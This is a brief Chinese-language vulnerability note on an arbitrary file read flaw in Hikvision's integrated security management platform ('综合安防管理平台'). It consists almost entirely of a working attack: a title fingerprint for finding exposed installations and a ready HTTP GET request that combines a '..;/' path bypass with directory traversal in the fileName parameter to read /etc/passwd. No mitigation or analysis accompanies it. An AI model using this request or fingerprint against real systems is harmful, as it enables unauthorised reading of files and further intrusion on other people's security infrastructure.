# 海康威视综合安防download存在任意文件读取漏洞

海康 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="综合安防管理平台"`
- **请求**：`GET /center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd HTTP/1.1`